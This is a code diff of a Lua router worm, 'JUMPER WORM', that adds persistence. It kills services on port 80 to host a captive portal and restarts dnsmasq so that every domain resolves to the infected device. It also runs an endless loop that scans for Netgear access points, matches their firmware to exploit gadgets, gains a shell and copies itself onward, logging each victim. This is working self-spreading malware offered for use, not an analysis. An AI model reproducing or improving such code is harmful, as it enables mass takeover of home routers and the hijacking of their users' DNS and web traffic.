@@ -299,48 +299,71 @@ local function setup_captive_portal()
 
   log("LAN IP: " .. my_lan_ip)
 
-  -- Start httpd for portal on WORM_PORT (serves /tmp/www/)
-  -- Already started by start_worm_server, but ensure portal is there
+  -- Ensure www dir exists
   exec("mkdir -p /tmp/www")
 
-  -- iptables: redirect all WiFi client HTTP (port 80) to our captive portal
-  -- br0 is the LAN bridge; WiFi clients come in via br0
-  -- We redirect external port 80 requests to our httpd on WORM_PORT
-  -- Except traffic destined to the router itself (admin interface)
+  -- ---------------------------------------------------------------
+  -- FREE PORT 80 — kill smbd, nmbd, and any other process on port 80
+  -- These routers do NOT have iptables, so we bind httpd directly to :80
+  -- ---------------------------------------------------------------
+  log("Clearing port 80 for portal...")
 
-  -- First clear any previous rules we added
-  exec("iptables -t nat -D PREROUTING -i br0 -p tcp --dport 80 " ..
-       "-j DNAT --to-destination " .. my_lan_ip .. ":" .. WORM_PORT .. " 2>/dev/null")
+  -- Kill Samba processes (smbd/nmbd often squat on port 80)
+  exec("killall smbd 2>/dev/null")
+  exec("killall nmbd 2>/dev/null")
+  sleep(1)
 
-  -- Add the redirect rule
-  local ok = exec("iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 " ..
-                   "! -d " .. my_lan_ip .. " " ..
-                   "-j DNAT --to-destination " .. my_lan_ip .. ":" .. WORM_PORT .. " 2>/dev/null")
+  -- Check if port 80 is still occupied and kill whatever is there
+  local p80 = exec_out("netstat -tlnp 2>/dev/null | grep ':80 '")
+  for pid in p80:gmatch("(%d+)/") do
+    -- Don't kill our own shell (telnetd on 8889)
+    local check = exec_out("netstat -tlnp 2>/dev/null | grep " .. pid)
+    if not check:find(":8889") then
+      log("Killing PID " .. pid .. " on port 80")
+      exec("kill " .. pid .. " 2>/dev/null")
+    end
+  end
+  sleep(1)
 
-  if ok == true then
-    log("iptables redirect: port 80 -> " .. my_lan_ip .. ":" .. WORM_PORT)
+  -- Start httpd on port 80 (primary portal port)
+  local bb = file_exists("/tmp/bin/busybox") and "/tmp/bin/busybox" or
+             file_exists("/tmp/bin/busybox-enhanced") and "/tmp/bin/busybox-enhanced" or
+             "busybox"
+  exec(bb .. " httpd -p 80 -h /tmp/www -c /dev/null 2>/dev/null")
+
+  -- Verify port 80
+  local verify80 = exec_out("netstat -tlnp 2>/dev/null | grep ':80 '")
+  if verify80:find("busybox") or verify80:find("httpd") then
+    log("httpd serving portal on port 80 (primary)")
   else
-    log("WARNING: iptables redirect may have failed (need root)")
+    log("WARNING: Could not bind port 80 — portal on " .. WORM_PORT .. " only")
   end
 
-  -- Also set up DNS hijack via dnsmasq if possible
-  -- Add a wildcard address to resolve all domains to our IP
-  exec("echo 'address=/#/" .. my_lan_ip .. "' > /tmp/dnsmasq_portal.conf 2>/dev/null")
-
-  -- Check if dnsmasq is running and try to add our config
-  local dnsmasq_pid = exec_out("pidof dnsmasq 2>/dev/null"):match("(%d+)")
-  if dnsmasq_pid then
-    -- Try to add our conf file and restart dnsmasq
-    exec("cp /tmp/dnsmasq_portal.conf /tmp/etc/dnsmasq_portal.conf 2>/dev/null")
-    -- Some routers read /tmp/etc/ for extra configs
-    exec("echo 'conf-file=/tmp/dnsmasq_portal.conf' >> /tmp/etc/dnsmasq.conf 2>/dev/null")
-    exec("kill -HUP " .. dnsmasq_pid .. " 2>/dev/null")
-    log("DNS hijack: all domains -> " .. my_lan_ip)
-  else
-    log("WARNING: dnsmasq not found, DNS hijack skipped")
+  -- ---------------------------------------------------------------
+  -- DNS HIJACK — dnsmasq with config file (avoids ash ~80 char truncation)
+  -- ---------------------------------------------------------------
+  -- Write config to file (ash truncates long inline commands)
+  local cf = io.open("/tmp/dp.conf", "w")
+  if cf then
+    cf:write("address=/#/" .. my_lan_ip .. "\n")
+    cf:close()
   end
 
-  log("Captive portal ready on port " .. WORM_PORT)
+  -- Kill existing dnsmasq and restart with our hijack config
+  exec("killall dnsmasq 2>/dev/null")
+  sleep(1)
+  exec("/usr/sbin/dnsmasq -C /tmp/dp.conf 2>/dev/null &")
+  sleep(1)
+
+  -- Verify dnsmasq
+  local dns_check = exec_out("ps 2>/dev/null | grep dnsmasq | grep -v grep")
+  if dns_check:find("dnsmasq") then
+    log("DNS hijack active: all queries -> " .. my_lan_ip)
+  else
+    log("WARNING: dnsmasq may not have started")
+  end
+
+  log("Captive portal ready on port 80 + " .. WORM_PORT)
   return true
 end
 
@@ -694,7 +717,7 @@ end
 -- =====================================================================
 
 local function main()
-  log("=== JUMPER WORM v1 ===")
+  log("=== JUMPER WORM v2 (persistent) ===")
   log("Hop " .. CUR_HOP .. "/" .. MAX_HOPS)
 
   if CUR_HOP >= MAX_HOPS then
@@ -726,161 +749,187 @@ local function main()
   -- Set up captive portal on this router
   setup_captive_portal()
 
-  -- Get our IPs (to tell targets where to download from)
-  local my_ips = get_my_ips()
-  if #my_ips == 0 then
-    log("WARNING: Could not determine own IP addresses")
-  else
-    log("My IPs: " .. table.concat(my_ips, ", "))
-  end
+  -- Track already-exploited BSSIDs so we don't re-exploit
+  local exploited_bssids = {}
+  local total_exploited = 0
+  local scan_round = 0
+  local SCAN_INTERVAL = 60  -- seconds between scan rounds
 
-  -- Scan for APs
-  local aps = wl_scan()
-  log("Found " .. #aps .. " APs")
-
-  -- Filter for Netgear targets
-  local targets = {}
-  for _, ap in ipairs(aps) do
-    if own_bssid and ap.bssid and ap.bssid:lower() == own_bssid:lower() then
-      goto skip
-    end
-    if is_netgear(ap) then
-      targets[#targets+1] = ap
-    end
-    ::skip::
-  end
-
-  -- Display scan results
-  log(string.format("%-30s %-19s %5s %3s %-6s %s",
-    "SSID", "BSSID", "RSSI", "Ch", "Band", ""))
-  log(string.rep("-", 80))
-  for _, ap in ipairs(aps) do
-    local is_tgt = false
-    for _, t in ipairs(targets) do
-      if t.bssid == ap.bssid then is_tgt = true; break end
-    end
-    log(string.format("%-30s %-19s %5s %3s %-6s %s",
-      (ap.ssid or "???"):sub(1,30),
-      ap.bssid or "???",
-      tostring(ap.rssi or "?"),
-      tostring(ap.channel or "?"),
-      ap.band or "?",
-      is_tgt and "<<< TARGET" or ""))
-  end
-
-  if #targets == 0 then
-    log("No Netgear targets found")
-    return
-  end
-
-  log(#targets .. " Netgear target(s) identified")
-
-  -- Sort by RSSI (strongest first)
-  table.sort(targets, function(a, b)
-    return (a.rssi or -999) > (b.rssi or -999)
-  end)
-
-  -- Try each target
-  local exploited = 0
-  for _, target in ipairs(targets) do
+  -- ===== PERSISTENT SCAN LOOP =====
+  while true do
+    scan_round = scan_round + 1
     log("")
-    log(">>> Targeting: " .. (target.ssid or "???") ..
-        " (" .. (target.bssid or "") .. ") RSSI:" .. tostring(target.rssi or "?"))
+    log("========================================")
+    log("SCAN ROUND " .. scan_round .. " (exploited so far: " .. total_exploited .. ")")
+    log("========================================")
 
-    -- Try common gateway IPs
-    for _, gw_ip in ipairs(GATEWAY_IPS) do
-      -- Skip our own IPs
-      local is_mine = false
-      for _, myip in ipairs(my_ips) do
-        if myip == gw_ip then is_mine = true; break end
+    -- Get our IPs (may change if interfaces come/go)
+    local my_ips = get_my_ips()
+    if #my_ips == 0 then
+      log("WARNING: Could not determine own IP addresses")
+    else
+      log("My IPs: " .. table.concat(my_ips, ", "))
+    end
+
+    -- Scan for APs
+    local aps = wl_scan()
+    log("Found " .. #aps .. " APs")
+
+    -- Filter for Netgear targets (skip already-exploited)
+    local targets = {}
+    for _, ap in ipairs(aps) do
+      if own_bssid and ap.bssid and ap.bssid:lower() == own_bssid:lower() then
+        goto skip
       end
-      if is_mine then goto next_ip end
-
-      if not port_open(gw_ip, 80, 2) then goto next_ip end
-
-      log("Port 80 open on " .. gw_ip .. " - probing...")
-
-      local det_model, det_fw = detect_model(gw_ip)
-      if not det_model then
-        csv_log(target.ssid, target.bssid, target.band,
-                tostring(target.channel), tostring(target.rssi),
-                "", "", gw_ip, "no_model_detected")
-        goto next_ip
+      if ap.bssid and exploited_bssids[ap.bssid:lower()] then
+        goto skip  -- already got this one
       end
-
-      local model = normalize_model(det_model)
-      if not model or not GADGETS[model] then
-        csv_log(target.ssid, target.bssid, target.band,
-                tostring(target.channel), tostring(target.rssi),
-                det_model, "", gw_ip, "model_not_in_db")
-        log("Model '" .. det_model .. "' not in gadget database")
-        goto next_ip
+      if is_netgear(ap) then
+        targets[#targets+1] = ap
       end
+      ::skip::
+    end
 
-      local version = extract_version(det_fw)
-      if not version or not GADGETS[model][version] then
-        csv_log(target.ssid, target.bssid, target.band,
-                tostring(target.channel), tostring(target.rssi),
-                model, det_fw or "", gw_ip, "version_not_exploitable")
-        log("Version " .. (det_fw or "?") .. " not exploitable for " .. model)
-        goto next_ip
+    -- Display scan results
+    log(string.format("%-30s %-19s %5s %3s %-6s %s",
+      "SSID", "BSSID", "RSSI", "Ch", "Band", ""))
+    log(string.rep("-", 80))
+    for _, ap in ipairs(aps) do
+      local is_tgt = false
+      local is_done = false
+      for _, t in ipairs(targets) do
+        if t.bssid == ap.bssid then is_tgt = true; break end
       end
+      if ap.bssid and exploited_bssids[ap.bssid:lower()] then
+        is_done = true
+      end
+      log(string.format("%-30s %-19s %5s %3s %-6s %s",
+        (ap.ssid or "???"):sub(1,30),
+        ap.bssid or "???",
+        tostring(ap.rssi or "?"),
+        tostring(ap.channel or "?"),
+        ap.band or "?",
+        is_done and "[DONE]" or (is_tgt and "<<< TARGET" or "")))
+    end
 
-      log("EXPLOITABLE: " .. model .. " v" .. version .. " at " .. gw_ip)
+    if #targets == 0 then
+      log("No new Netgear targets this round")
+      log("Sleeping " .. SCAN_INTERVAL .. "s before next scan...")
+      sleep(SCAN_INTERVAL)
+      goto continue_scan
+    end
 
-      -- Send exploit
-      if send_exploit(gw_ip, model, version) then
-        csv_log(target.ssid, target.bssid, target.band,
-                tostring(target.channel), tostring(target.rssi),
-                model, version, gw_ip, "SHELL_OK")
+    log(#targets .. " new Netgear target(s) identified")
 
-        -- Try to deploy worm to new target
-        local deployed = false
+    -- Sort by RSSI (strongest first)
+    table.sort(targets, function(a, b)
+      return (a.rssi or -999) > (b.rssi or -999)
+    end)
+
+    -- Try each target
+    for _, target in ipairs(targets) do
+      log("")
+      log(">>> Targeting: " .. (target.ssid or "???") ..
+          " (" .. (target.bssid or "") .. ") RSSI:" .. tostring(target.rssi or "?"))
+
+      -- Try common gateway IPs
+      for _, gw_ip in ipairs(GATEWAY_IPS) do
+        -- Skip our own IPs
+        local is_mine = false
         for _, myip in ipairs(my_ips) do
-          log("Trying to deploy from " .. myip .. "...")
-          -- Check if target can reach us
-          deployed = deploy_to_target(gw_ip, myip)
-          if deployed then break end
+          if myip == gw_ip then is_mine = true; break end
         end
+        if is_mine then goto next_ip end
 
-        if deployed then
+        if not port_open(gw_ip, 80, 2) then goto next_ip end
+
+        log("Port 80 open on " .. gw_ip .. " - probing...")
+
+        local det_model, det_fw = detect_model(gw_ip)
+        if not det_model then
           csv_log(target.ssid, target.bssid, target.band,
                   tostring(target.channel), tostring(target.rssi),
-                  model, version, gw_ip, "WORM_DEPLOYED")
-          log("WORM DEPLOYED to " .. gw_ip .. "!")
+                  "", "", gw_ip, "no_model_detected")
+          goto next_ip
+        end
+
+        local model = normalize_model(det_model)
+        if not model or not GADGETS[model] then
+          csv_log(target.ssid, target.bssid, target.band,
+                  tostring(target.channel), tostring(target.rssi),
+                  det_model, "", gw_ip, "model_not_in_db")
+          log("Model '" .. det_model .. "' not in gadget database")
+          goto next_ip
+        end
+
+        local version = extract_version(det_fw)
+        if not version or not GADGETS[model][version] then
+          csv_log(target.ssid, target.bssid, target.band,
+                  tostring(target.channel), tostring(target.rssi),
+                  model, det_fw or "", gw_ip, "version_not_exploitable")
+          log("Version " .. (det_fw or "?") .. " not exploitable for " .. model)
+          goto next_ip
+        end
+
+        log("EXPLOITABLE: " .. model .. " v" .. version .. " at " .. gw_ip)
+
+        -- Send exploit
+        if send_exploit(gw_ip, model, version) then
+          csv_log(target.ssid, target.bssid, target.band,
+                  tostring(target.channel), tostring(target.rssi),
+                  model, version, gw_ip, "SHELL_OK")
+
+          -- Try to deploy worm to new target
+          local deployed = false
+          for _, myip in ipairs(my_ips) do
+            log("Trying to deploy from " .. myip .. "...")
+            deployed = deploy_to_target(gw_ip, myip)
+            if deployed then break end
+          end
+
+          if deployed then
+            csv_log(target.ssid, target.bssid, target.band,
+                    tostring(target.channel), tostring(target.rssi),
+                    model, version, gw_ip, "WORM_DEPLOYED")
+            log("WORM DEPLOYED to " .. gw_ip .. "!")
+          else
+            csv_log(target.ssid, target.bssid, target.band,
+                    tostring(target.channel), tostring(target.rssi),
+                    model, version, gw_ip, "shell_ok_no_deploy")
+          end
+
+          total_exploited = total_exploited + 1
+          -- Mark this BSSID as done
+          if target.bssid then
+            exploited_bssids[target.bssid:lower()] = true
+          end
+          goto next_target  -- Exploited this target, move to next AP
         else
           csv_log(target.ssid, target.bssid, target.band,
                   tostring(target.channel), tostring(target.rssi),
-                  model, version, gw_ip, "shell_ok_no_deploy")
+                  model, version, gw_ip, "exploit_no_shell")
         end
 
-        exploited = exploited + 1
-        goto next_target  -- Exploited this target, move to next AP
-      else
-        csv_log(target.ssid, target.bssid, target.band,
-                tostring(target.channel), tostring(target.rssi),
-                model, version, gw_ip, "exploit_no_shell")
+        ::next_ip::
       end
 
-      ::next_ip::
+      -- If we get here, no gateway IP worked for this target
+      csv_log(target.ssid, target.bssid, target.band,
+              tostring(target.channel), tostring(target.rssi),
+              "", "", "", "unreachable")
+
+      ::next_target::
     end
 
-    -- If we get here, no gateway IP worked for this target
-    csv_log(target.ssid, target.bssid, target.band,
-            tostring(target.channel), tostring(target.rssi),
-            "", "", "", "unreachable")
+    -- Round summary
+    log("")
+    log("Round " .. scan_round .. " complete — total exploited: " .. total_exploited)
+    log("Sleeping " .. SCAN_INTERVAL .. "s before next scan...")
+    sleep(SCAN_INTERVAL)
 
-    ::next_target::
+    ::continue_scan::
   end
-
-  -- Summary
-  log("")
-  log("========================================")
-  log("JUMPER COMPLETE — hop " .. CUR_HOP)
-  log("Targets found: " .. #targets)
-  log("Routers exploited: " .. exploited)
-  log("CSV log: " .. CSV_PATH)
-  log("========================================")
+  -- (loop never exits — worm runs persistently)
 end
 
 -- Run
